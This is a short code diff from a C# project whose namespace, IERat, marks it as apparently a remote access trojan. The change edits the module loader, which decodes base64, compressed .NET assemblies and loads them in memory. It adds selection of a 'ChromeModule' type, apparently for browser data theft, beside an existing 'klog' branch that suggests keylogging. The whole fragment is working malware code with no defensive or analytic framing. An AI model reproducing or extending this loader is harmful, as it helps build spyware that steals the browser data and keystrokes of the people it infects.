@@ -6,13 +6,20 @@ namespace IERat.lib
 {
     class Modules
     {
-        public static object LoadModule(string ModuleData)
+        public static object LoadModule(string ModuleData, string cmdType = "")
         {
             Assembly assembly = Assembly.Load(Utils.Decompress(Convert.FromBase64String(ModuleData)));
             var TypesEnumerator = assembly.ExportedTypes.GetEnumerator();
             TypesEnumerator.MoveNext();
             var Type = TypesEnumerator.Current;
-            //var ClassInstance = Activator.CreateInstance(Type);
+            if (cmdType == "chrome") 
+            { 
+                while (Type.FullName != "ChromeModule.ChromeModule")
+                {
+                    TypesEnumerator.MoveNext();
+                    Type = TypesEnumerator.Current;
+                }
+            }
             var Start = Type.GetMethod("Start");
             if (Type.Name.Contains("klog"))
             {
